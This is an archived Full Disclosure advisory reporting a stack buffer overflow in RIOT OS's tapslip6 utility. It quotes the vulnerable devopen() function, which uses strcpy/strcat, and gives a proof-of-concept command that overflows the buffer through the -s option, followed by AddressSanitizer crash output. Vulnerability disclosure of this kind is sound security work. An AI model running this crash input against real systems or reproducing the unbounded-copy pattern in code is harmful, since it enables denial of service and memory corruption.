---
title: RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in tapslip6 Utility via Unbounded Device Path Construction
url: https://seclists.org/fulldisclosure/2026/Jan/15
source: Full Disclosure
date: 2026-01-11
fetch_date: 2026-01-12T03:37:54.692115
---

# RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in tapslip6 Utility via Unbounded Device Path Construction

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

![](/shared/images/nst-icons.svg#search)

# RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in tapslip6 Utility via Unbounded Device Path Construction

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Thu, 8 Jan 2026 10:42:45 -0500

---

```
A stack-based buffer overflow vulnerability exists in the tapslip6 utility
distributed with RIOT OS (and derived from the legacy uIP/Contiki
networking tools). The vulnerability is caused by unsafe string
concatenation in the devopen() function, which constructs a device path
using unbounded user-controlled input.
Specifically, tapslip6 uses strcpy() and strcat() to concatenate the fixed
prefix "/dev/" with a user-supplied device name provided via the -s
command-line option. No bounds checking is performed, allowing an attacker
to supply an excessively long device name and overflow a fixed-size stack
buffer. This issue can lead to process crashes and memory corruption. While
exploitation requires local access, the affected utility is commonly
executed with elevated privileges during development, testing, or
deployment of RIOT OS networking environments, increasing impact.

*Root Cause:*int devopen(const char *dev, int flags)
{
    char t[1024];
    strcpy(t, "/dev/");
    strcat(t, dev);
    return open(t, flags);
}

*Impact:*

   - Stack-based buffer overflow
   - Process termination (Denial of Service)
   - Memory corruption

*Proof of Concept:*./tapslip6 -s $(python3 - << 'EOF'
print("A"*3000)
EOF
) 10.0.0.1 255.255.255.0

*Output:*=================================================================
==492967==ERROR: AddressSanitizer: stack-buffer-overflow on address
0xfbffa6001140 at pc 0xaaaab3e609a4 bp 0xffffd6e212c0 sp 0xffffd6e20ab0
WRITE of size 3001 at 0xfbffa6001140 thread T0
    #0 0xaaaab3e609a0 in strcat
(/root/RIOT/dist/tools/tunslip/tapslip6+0xc09a0) (BuildId:
cf8e25195b4cb64b5a381ae2324d1971ccc6d6ab)
    #1 0xaaaab3ec04f0 in devopen
/root/RIOT/dist/tools/tunslip/tapslip6.c:420:5
    #2 0xaaaab3ec04f0 in main
/root/RIOT/dist/tools/tunslip/tapslip6.c:629:18
    #3 0xffffa7a42598 in __libc_start_call_main
csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #4 0xffffa7a42678 in __libc_start_main csu/../csu/libc-start.c:360:3
    #5 0xaaaab3dd73ec in _start
(/root/RIOT/dist/tools/tunslip/tapslip6+0x373ec) (BuildId:
cf8e25195b4cb64b5a381ae2324d1971ccc6d6ab)

Address 0xfbffa6001140 is located in stack of thread T0 at offset 4416 in
frame
    #0 0xaaaab3ebfef8 in main /root/RIOT/dist/tools/tunslip/tapslip6.c:543

SUMMARY: AddressSanitizer: stack-buffer-overflow
(/root/RIOT/dist/tools/tunslip/tapslip6+0xc09a0) (BuildId:
cf8e25195b4cb64b5a381ae2324d1971ccc6d6ab) in strcat
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

### Current thread:

* **RIOT OS 2026.01-devel-317 Stack-Based Buffer Overflow in tapslip6 Utility via Unbounded Device Path Construction** *Ron E (Jan 10)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")